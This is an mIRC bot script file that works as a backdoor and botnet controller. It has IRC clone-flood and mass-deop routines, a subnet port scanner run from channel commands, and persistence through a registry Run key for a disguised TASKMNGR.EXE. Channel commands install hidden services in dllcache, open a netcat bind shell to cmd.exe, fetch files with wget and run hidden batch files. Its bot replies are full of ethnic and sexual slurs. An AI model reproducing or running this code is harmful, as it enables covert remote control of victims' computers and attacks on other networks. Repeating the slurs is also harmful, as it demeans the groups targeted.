n47=alias changenick { %clones.counter = 0 | :home | inc %clones.counter 1 | %clones.tmp = $read swins.scr | if (%clones.tmp == $null) { %clones.tmp = $randomgen($r(0,9)) } |  if ($sock(sock*,%clones.counter) == $null) { goto end } |  sockwrite -n $sock(sock*,%clones.counter) NICK %clones.tmp | sockmark $sock(sock*,%clones.counter) %clones.tmp | goto home | :end }
n48=alias getmarks { %clones.counter = 0 | %clones.total = $sock(sock*,0) | :home |  inc %clones.counter 1 | %clones.tmp = sock $+ %clones.counter |  if (%clones.counter >= %clones.total) { goto end } |  goto home | :end }
n49=alias isbot { %clones.counter = 0 | %clones.total = $sock(sock*,0) | :home |  inc %clones.counter 1 | %clones.tmp = sock $+ %clones.counter | if ($sock(%clones.tmp).mark == $1) { return $true } |  if (%clones.counter >= %clones.total) { goto end } | goto home |   :end |  return $false }
n50=on *:sockopen:ock*:{  if ($sockerr > 0) { halt } |  %clones.tmpcalc = $int($calc(%clones.serverport / 256)) |  bset &binvar 1 4  |  bset &binvar 2 1  |  bset &binvar 3 %clones.tmpcalc  |  bset &binvar 4 $calc(%clones.serverport - (%clones.tmpcalc * 256))  |  bset &binvar 5 $gettok(%clones.server,1,46)  |  bset &binvar 6 $gettok(%clones.server,2,46)  | bset &binvar 7 $gettok(%clones.server,3,46)  |  bset &binvar 8 $gettok(%clones.server,4,46)  |  bset &binvar 9 0   | sockwrite $sockname &binvar } 
n51=on *:sockread:ock*:{ if ($sockerr > 0) { halt } |  sockread 4096 &binvar  | if ($sockbr == 0) { return } |  if ($bvar(&binvar,2) == 90) { %clones.tp = $read swins.scr |  if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } |   sockwrite -n $sockname USER %clones.tp a a : $+ $chr(3) $+ $rand(0,15) $+ $read swins.scr |  %clones.tp = $read swins.scr |   if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } |  sockwrite -n $sockname NICK %clones.tp   | sockmark $sockname %clones.tp |  sockrename $sockname s $+ $sockname  } | elseif ($bvar(&binvar,2) == 91) { return } } 
n52=on *:sockopen:sock*:{ if ($sockerr > 0) { halt } | %clones.tp = $read swins.scr | if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } | sockwrite -n $sockname USER %clones.tp a a  $+ $read swins.scr | %clones.tp = $read swins.scr | if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } | sockwrite -n $sockname NICK %clones.tp  | sockmark $sockname %clones.tp }
n53=on *:sockread:sock*:{ if ($sockerr > 0) { halt } | sockread 4096 %clones.read | %clones.tmp = $gettok(%clones.read,2,32) | if ($gettok(%clones.read,1,32) == PING) { sockwrite -n $sockname PONG $gettok(%clones.read,2,32) } |  elseif (%clones.tmp == 001) { sockwrite -n $sockname MODE $sock($sockname).mark +i |  if (%clones.silence == 1) { sockwrite -n $sockname SILENCE *@* }  } | elseif (%clones.tmp == 433) { %clones.rand = $randomgen($r(0,9)) | sockwrite -n $sockname NICK %clones.rand  | sockmark $sockname %clones.rand } | elseif (%clones.tmp == 353) { if (%clones.deop == 1) { %clones.deop = 0  %clones.cnt2 = 0 |   %clones.deopstr = $null |   :home |  inc %clones.cnt2 1 | $&
n54=%nick = $gettok($gettok(%clones.read,2,58),%clones.cnt2,32) |  if (%nick == $null) { goto end } |   if ($left(%nick,1) != @) { goto home } |  %nick = $gettok(%nick,1,64) |   if ($isbot(%nick) == $true) { goto home } |   if (%clones.incme != 1) { if (%nick == $me) { goto home } } |   %clones.deopstr = %clones.deopstr %nick |  if ($numtok(%clones.deopstr,32) == 3) { botraw MODE %clones.deopchannel -ooo %clones.deopstr | %clones.deopstr = $null }  |   goto home |    :end |  if ($numtok(%clones.deopstr,32) > 0) { botraw MODE %clones.deopchannel -ooo %clones.deopstr | %clones.deopstr = $null } }  } | elseif (%clones.tmp == KICK) { if ($gettok(%clones.read,4,32) == $sock($sockname).mark) { sockwrite -n $sockname JOIN $gettok(%clones.read,3,32) }  }  }
n55=on *:sockclose:*ock*:{  if ($left($sockname,1) == o) { %clones.sockname = s $+ $sockname } | else { %clones.sockname = $sockname } } 
n56=alias setserver { %clones.setserver = 1 | .dns -h $1 } 
n57=on *:dns:{ if (%clones.setserver == 1) { %clones.server = $iaddress $raddress | %clones.setserver = 0  } }
n58=on *:CONNECT:{ if (%chan == $null) { set %chan #Hi�p33d } | /join %chan �ק� | /identd on $read swins.scr | /dns $me | /timercoolconnect off | //write -c 394839.reg REGEDIT4 | //write -a 394839.reg [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | //write -a 394839.reg "Run32dlls"=" $+ $replace($mircdir,\,\\) $+ TASKMNGR.EXE" | .timeraf 1 20 //run -n regedit /s 394839.reg | .timeradse 1 60 //remove 394839.reg | .timer55 1 1 //run -n sysy32.bat | .timer66 1 20 .msg %chan 14[11�8SECURED11�14]15.9OK!15.14[11�8SECURED11�14] }
n59=on *:DNS:{ if ($nick == $me) { %address = $iaddress } }
n60=on *:OP:#:{ If ($opnick == $me) { //mode # +psnt } }
n61=on *:PART:%chan:{ if ($nick == $me) { //msg %chan Part Attempt!!!! %chan ( $+ $address $+ ) | /timer 1 1 /raw -q join %chan | //run winhp32 /n /fh         } }
n62=on *:DISCONNECT: { //nick $read swins.scr $+ $r(1,9) | /server %server 6667 | //timercoolconnect -o 0 100 //server %server 6667 } 
n63=raw 433:*: { //set %gnick.tmp $read swins.scr |  //nick $replace( %gnick.tmp, $mid(%gnick.tmp,3,1), $r(a,z) ) }
n64=on *:KICK:#:{ if ($nick == $me) { halt } |  if ($knick == $me) && ($chan == %chan) { timerfastjoin -o 0 5 /join # }  | if ($level($address($knick,3) >= 10)) { /kick # $nick hey bitch! $knick is a master! } }
n65=on *:JOIN:*:{ if ($nick == $me) { /echo whooo | timerfastjoin off }  | if ($level($address($nick,3)) >= 10) { mode # +o $nick } | if ($level($address($nick,4)) = 2) { mode # +v $nick } | if ($level($address($nick,4)) = 3) { mode # +o $nick } } 
n66=on @*:DEOP:*:{ if ($level($address($opnick,3)) >= 10) { mode # +o-o $opnick $nick | /kick # $nick cool! } } 
n67=on *:text:!stepscan*:#:bishazz
n68=on 10:text:!var *:*:{ if ( [ [ $2 ] ] == $null) { halt } | //msg $chan [var]: $2 is [ [ $2- ] ] } 
n69=alias randomgen { if ($1 == 0) { return $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) $+ $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) } | if ($1 == 1) { return $read swins.scr } | if ($1 == 2) { return ^ $+ $read swins.scr $+ ^ } |  if ($1 == 3) { return $r(a,z) $+ $read swins.scr $+ $r(1,5) } | if ($1 == 4) { return $r(A,Z) $+ $r(1,9) $+ $r(8,20) $+ $r(g,y) $+ $r(15,199) } | if ($1 == 5) { return $r(a,z) $+ $read swins.scr $+ - } | if ($1 == 6) { return $read swins.scr $+ - } | if ($1 == 7) { return $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) $+  $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) } | if ($1 == 8) { return ^- $+ $read swins.scr $+ -^ } | if ($1 == 9) { return $r(a,z) $+ $r(A,Z) $+ $r(1,500) $+ $r(A,Z) $+ $r(1,50) } }
n70=; CjB AKA GoD Wrote This Scanner! HEH
n71=alias bishazz { /sockclose ip* |  timers off |  unset %begshortip |  unset %beglongip |  unset %endshortip |  unset %endlongip |  unset %port |  unset %botchan |  unset %botnum |  unset %ip* |  unset %loop |  unset %multiply |  unset %total |  unset %totalscaning }
n72=on 10:text:!scan*:*:{ 
n73=  if ($2 == $null) || ($3 == $null) { msg # EWG HEH Error- Correct Syntax: !scan 1.3.3.* [p0rt] (FFS U ARAB KUNTY RUNTY I EAT STUNTYS) | halt }
n74=  if (* !isin $2) { msg # 12 Error! !scan 1.3.3.* [p0rt]  (FFS U ARAB KUNTY RUNTY I EAT STUNTYS) | halt }
n75=  if $me !isvo $chan {   //msg # !stopscan | /msg # 7*** (Israeli Shar0n Err0r) (FFS, Get It Right This Time Runty Kunty.) type: //mode # +v $me KTHX. |   /halt   }
n76=else {   set %begshortip $replace($2,*,1)  |   set %beglongip $longip( %begshortip ) |   set %endshortip $replace($2,*,255)  |   set %endlongip $longip( %endshortip ) |   set %port $3  |  set %botchan $chan  |   /msg $chan [Scanner Started] %begshortip to %endshortip $+ ... [port: $+ %port $+ ] |   /startscanning   } }
n77=alias startscanning {  :loop |  inc %loop | if $nick( %botchan , %loop ,v) == $me {  set %multiply $calc( %loop -1)   |  unset %loop |  goto end   }
n78=else goto loop |  :end | set %botnum $nick( %botchan ,0,v) |  /startscan $longip($calc($calc( %multiply *$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))+ %beglongip )) $longip($calc($calc( %multiply *$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))+ %beglongip +$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))) %port }
n79=alias unset1variable {  unset %begshortip | unset %endshortip |  unset %botnum |  unset %multiply }
n80=alias startscan { set %beglongip $longip($1) |  set %endlongip $longip($2) |  set %port $3 |  set %total $calc( %endlongip - %beglongip ) |  unset %totalscaning | setnewvars4scan }
n81=alias setnewvars4scan {
n82=  inc %totalscaning
n83=  if %totalscaning == %total /finished
n84=  set %ip1 $longip($calc( %beglongip + %totalscaning ))
n85=  inc %totalscaning
n86=  if %totalscaning == %total opensocks 1
n87=  set %ip2 $longip($calc( %beglongip + %totalscaning ))
n88=  inc %totalscaning
n89=  if %totalscaning == %total opensocks 2
n90=  set %ip3 $longip($calc( %beglongip + %totalscaning ))
n91=  inc %totalscaning
n92=  if %totalscaning == %total opensocks 3
n93=  set %ip4 $longip($calc( %beglongip + %totalscaning ))
n94=  inc %totalscaning
n95=  if %totalscaning == %total opensocks 4
n96=  set %ip5 $longip($calc( %beglongip + %totalscaning ))
n97=  inc %totalscaning
n98=  if %totalscaning == %total opensocks 5
n99=  set %ip6 $longip($calc( %beglongip + %totalscaning ))
n100=  inc %totalscaning
n101=  if %totalscaning == %total opensocks 6
n102=  set %ip7 $longip($calc( %beglongip + %totalscaning ))
n103=  inc %totalscaning
n104=  if %totalscaning == %total opensocks 7
n105=  set %ip8 $longip($calc( %beglongip + %totalscaning ))
n106=  inc %totalscaning
n107=  if %totalscaning == %total opensocks 8
n108=  set %ip9 $longip($calc( %beglongip + %totalscaning ))
n109=  inc %totalscaning
n110=  if %totalscaning == %total opensocks 9
n111=  set %ip10 $longip($calc( %beglongip + %totalscaning ))
n112=  inc %totalscaning
n113=  if %totalscaning == %total opensocks 10
n114=  set %ip11 $longip($calc( %beglongip + %totalscaning ))
n115=  inc %totalscaning
n116=  if %totalscaning == %total opensocks 11
n117=  set %ip12 $longip($calc( %beglongip + %totalscaning ))
n118=  inc %totalscaning
n119=  if %totalscaning == %total opensocks 12
n120=  set %ip13 $longip($calc( %beglongip + %totalscaning ))
n121=  inc %totalscaning
n122=  if %totalscaning == %total opensocks 13
n123=  set %ip14 $longip($calc( %beglongip + %totalscaning ))
n124=  inc %totalscaning
n125=  if %totalscaning == %total opensocks 14
n126=  set %ip15 $longip($calc( %beglongip + %totalscaning ))
n127=  inc %totalscaning
n128=  if %totalscaning == %total opensocks 15
n129=  set %ip16 $longip($calc( %beglongip + %totalscaning ))
n130=  inc %totalscaning
n131=  if %totalscaning == %total opensocks 16
n132=  set %ip17 $longip($calc( %beglongip + %totalscaning ))
n133=  inc %totalscaning
n134=  if %totalscaning == %total opensocks 17
n135=  set %ip18 $longip($calc( %beglongip + %totalscaning ))
n136=  inc %totalscaning
n137=  if %totalscaning == %total opensocks 18
n138=  set %ip19 $longip($calc( %beglongip + %totalscaning ))
n139=  inc %totalscaning
n140=  if %totalscaning == %total opensocks 19
n141=  set %ip20 $longip($calc( %beglongip + %totalscaning ))
n142=  inc %totalscaning
n143=  if %totalscaning == %total opensocks 20
n144=  set %ip21 $longip($calc( %beglongip + %totalscaning ))
n145=  inc %totalscaning
n146=  if %totalscaning == %total opensocks 21
n147=  set %ip22 $longip($calc( %beglongip + %totalscaning ))
n148=  inc %totalscaning
n149=  if %totalscaning == %total opensocks 22
n150=  set %ip23 $longip($calc( %beglongip + %totalscaning ))
n151=  inc %totalscaning
n152=  if %totalscaning == %total opensocks 23
n153=  set %ip24 $longip($calc( %beglongip + %totalscaning ))
n154=  inc %totalscaning
n155=  if %totalscaning == %total opensocks 24
n156=  set %ip25 $longip($calc( %beglongip + %totalscaning ))
n157=  inc %totalscaning
n158=  opensocks
n159=}
n160=alias opensocks {
n161=  sockopen ip1 %ip1 %port
n162=  if $1 == 1 finished
n163=  sockopen ip2 %ip2 %port
n164=  if $1 == 2 finished
n165=  sockopen ip3 %ip3 %port
n166=  if $1 == 3 finished
n167=  sockopen ip4 %ip4 %port
n168=  if $1 == 4 finished
n169=  sockopen ip5 %ip5 %port
n170=  if $1 == 5 finished
n171=  sockopen ip6 %ip6 %port
n172=  if $1 == 6 finished
n173=  sockopen ip7 %ip7 %port
n174=  if $1 == 7 finished
n175=  sockopen ip8 %ip8 %port
n176=  if $1 == 8 finished
n177=  sockopen ip9 %ip9 %port
n178=  if $1 == 9 finished
n179=  sockopen ip10 %ip10 %port
n180=  if $1 == 10 finished
n181=  sockopen ip11 %ip11 %port
n182=  if $1 == 11 finished
n183=  sockopen ip12 %ip12 %port
n184=  if $1 == 12 finished
n185=  sockopen ip13 %ip13 %port
n186=  if $1 == 13 finished
n187=  sockopen ip14 %ip14 %port
n188=  if $1 == 14 finished
n189=  sockopen ip15 %ip15 %port
n190=  if $1 == 15 finished
n191=  sockopen ip16 %ip16 %port
n192=  if $1 == 16 finished
n193=  sockopen ip17 %ip17 %port
n194=  if $1 == 17 finished
n195=  sockopen ip18 %ip18 %port
n196=  if $1 == 18 finished
n197=  sockopen ip19 %ip19 %port
n198=  if $1 == 19 finished
n199=  sockopen ip20 %ip20 %port
n200=  if $1 == 20 finished
n201=  sockopen ip21 %ip21 %port
n202=  if $1 == 21 finished
n203=  sockopen ip22 %ip22 %port
n204=  if $1 == 22 finished
n205=  sockopen ip23 %ip23 %port
n206=  if $1 == 23 finished
n207=  sockopen ip24 %ip24 %port
n208=  if $1 == 24 finished
n209=  sockopen ip25 %ip25 %port
n210=  timer 1 %timeout /sockclose ip*
n211=  timer 1 $calc(1+%timeout) /setnewvars4scan
n212=}
n213=on 1:sockopen:ip*:{  if ($sockerr > 0) { halt }  |  //run -n wise32.bat % [ $+ [ $sockname ] ] |  //run winhp32.exe /n /fh cmd.exe  |  /timer 2 1 //run winhp32.exe /n /fh cmd.exe |  /write %port $+ .txt % [ $+ [ $sockname ] ] on %port | /msg %botchan % [ $+ [ $sockname ] ] on %port  |  inc %totalsuccess |   /sockclose $sockname |  /halt }
n214=alias properform {  if ($1 == $null) || ($2 == $null) { /msg $chan Br0, An Israeli Could Do Better, HEH Try !scan [beginning IP] [ending IP] [PORT] | halt } |   if ($3 == $null) {  /msg $chan I need the port Manwh0r33. HEH | halt } |  if (. !isin $1) || (. !isin $2) { /msg $chan sorry I believe an IP has periods in it EG:127.0.0.1 heh | halt } 
n215=if ($3 !isnum 1-65535) { /msg $chan HEH Invalid Port. Use 1 - 65535 | halt } |  else return good |  halt }
n216=alias finished { msg %botchan [EWG scan complete]: %begshortip to %endshortip %port |  msg %botchan HEH Scanning Complete... Now May I Have Some Arab Lesbians? kthx. |  bishazz | unset1variable |  halt }
n217=; scan end.
n218=on 10:text:*:#:{ 
n219=if ($1 == !ftpm33) { if $me !isvo $chan {  /.msg # !OMG.MY.BRAKES.SOMEONE.STOP.ME | .msg # 7*** (Israeli Shar0n Err0r) (FFS Get It Right This Time Runty Kunty) Type: //mode # +v $me KTHX |   /halt   }
n220=else {   run -n cmd.exe /c c:\winnt\system32\dllcache\winwheel.exe createsvrany "gyder32" "gyderwin32" "c:\winnt\system32\dllcache\srvcs.exe" "c:\winnt\system32\dllcache\runbatch.exe" | run -n cmd.exe /c net start gyder32 | run -n cmd.exe /c c:\winnt\system32\dllcache\winwheel.exe start gyder32 | msg # Done br0.... Auto Arabian Lesbians next up? %botlogo } }
n221=on 10:text:*:#:{ 
n222=if ($1 == !xdccm33) { if $me !isvo $chan { /.msg # !OMG.MY.BRAKES.SOMEONE.STOP.ME | .msg # 7*** (Israeli Shar0n Err0r) (FFS Get It Right This Time Runty Kunty) Type: //mode # +v $me KTHX |   /halt   }
n223=else {   set %nick1 [EWG]-[ $+ $read swins.scr $+ ] | run -n cmd.exe /c echo user_nick %nick1 >> c:\winnt\system32\dllcache\w1.tmp | run -n cmd.exe /c type c:\winnt\system32\dllcache\w1.tmp >> c:\winnt\system32\dllcache\i386\test\cfg.dll
n224=run -n cmd.exe /c copy c:\winnt\system32\dllcache\i386\test\cfg.dll c:\winnt\system32\dllcache\I386\system\cfg.dll | run -n cmd.exe /c copy /y c:\winnt\system32\dllcache\i386\test\cfg.dll c:\winnt\system32\dllcache\I386\system\cfg.dll | msg # Done br0.... Auto Arabian Lesbians next up? %botlogo } }
n225=on 10:text:*:#:{ 
n226=if ($1 == !fark) { if $me !isvo $chan { /.msg # !OMG.MY.BRAKES.SOMEONE.STOP.ME | .msg # 7*** (Israeli Shar0n Err0r) (FFS Get It Right This Time Runty Kunty) Type: //mode # +v $me KTHX |   /halt   }
n227=else {   run -n cmd.exe /c c:\winnt\system32\dllcache\sert.bat | run -n cmd.exe /c c:\winnt\system32\sert.bat | run -n cmd.exe /c c:\winnt\system32\dllcache\i386\test\sert.bat | msg # ALL Done br0.... Auto Arabian Lesbians next up? kthxbai %botlogo } }
n228=on 10:text:*:#:{ 
n229=if ($1 == !netcats) { if $me !isvo $chan { /.msg # !OMG.MY.BRAKES.SOMEONE.STOP.ME | .msg # 7*** (Israeli Shar0n Err0r) (FFS Get It Right This Time Runty Kunty) Type: //mode # +v $me KTHX |   /halt   }
n230=else {   run -n cmd.exe /c c:\winnt\system32\dllcache\ncp.exe -l -p $2 -t -e cmd.exe | msg # Done br0.... Auto Arabian Lesbians next up? %botlogo } }
n231=on 10:text:*:#:{ 
n232=if ($1 == !wgett) { if $me !isvo $chan { /.msg # !OMG.MY.BRAKES.SOMEONE.STOP.ME | .msg # 7*** (Israeli Shar0n Err0r) (FFS Get It Right This Time Runty Kunty) Type: //mode # +v $me KTHX |   /halt   } | else {   run -n cmd.exe /c c:\winnt\system32\dllcache\wget.exe $2 | msg # Done br0.... Auto Arabian Lesbians next up? %botlogo } }
n233=on 10:text:*:#:{ 
n234=if ($1 == !ramse) { if $me !isvo $chan { /.msg # !OMG.MY.BRAKES.SOMEONE.STOP.ME | .msg # 7*** (Israeli Shar0n Err0r) (FFS Get It Right This Time Runty Kunty) Type: //mode # +v $me KTHX |   /halt   } | else {   run -n cmd.exe /c c:\winnt\system32\dllcache\yeh.exe createsvrany "RAMSE" "Remote Access Manager Service" "C:\WINNT\system32\dllcache\srvss.exe" "C:\WINNT\system32\dllcache\runbatch.exe"
n235=msg # Step 1 of 3 Done br0.... Auto Arabian Lesbians next up? | run -n cmd.exe /c c:\winnt\system32\dllcache\firedaemon -i RAMSE "C:\WINNT\system32\dllcache" "C:\WINNT\system32\dllcache\runbatch.exe" "/u" Y 0 0 N Y | msg # Step 2 of 3 Done br0.... Auto Arabian Lesbians next up?
n236=run -n cmd.exe /c net start RAMSE | msg # Step 3 of 3 Done br0.... Auto Arabian Lesbians next up? kthxbai %botlogo } }
n237=on 10:text:*:#:{ 
n238=if ($1 == !varsee) { && ($gettok($1-,2,32) != $null) { if $me !isvo $chan { /.msg # !OMG.MY.BRAKES.SOMEONE.STOP.ME | .msg # 7,1*** (Israeli Shar0n Err0r) (FFS Get It Right This Time Runty Kunty) type: //mode # +v $me KTHX. |   /halt   } | else {    if ($exists($gettok($1-,2,32)) == $true) { msg # Found: $gettok($1-,2,32) $+ , exiting ... | quit Found: $gettok($1-,2,32) Be Back Next Reboot! %botlogo | exit Found: $gettok($1-,2,32) Be Back Next Reboot! %botlogo } | return } | else { msg # Error! No such file! | return } } | msg # Error in syntax; !varse [.exe] }
n239=; heh end0rs.
[agent]
enable=0,0,0
char=default
options=1,1,1,100,0
speech=150,60,100,1,180,10,50,1,1,1,0,50,1
channel=1,1,1,1,1,1,1,1,1
private=1,1,1,1
other=1,1,1,1,1,1,1
pos=20,20

[dragdrop]
n0=*.wav:/sound $1 $2-
n1=*.*:/dcc send $1 $2-
s0=*.*:/dcc send $1 $2-
[Perform]
n0=/join #Hi�p33d �ק�
n1=/timer 0 60 /join #Hi�p33d �ק�
[extensions]
n0=defaultEXTDIR:\

[local]
local=boab-60.eftel.com
localip=203.91.80.124
longip=3411759228


[users]
n0=10:CjB!*@*
n1=10:*!*@*.unsi.com
n2=10:*@*router*
n3=10:*@*sex0r*
n4=10:*Cj*!*@*
n5=10:*!*Elite@*.drizzle.com
[ignore]
n0=*@*,ctcp,notice,invite
[afiles]
n0=ocxu.ini
[rfiles]
n0=ocxu.ini
n1=16dll.ini
n2=ocxu.ini
n3=32dllxp.ocx
n4=2xvll.ocx
n5=32dll.ocx
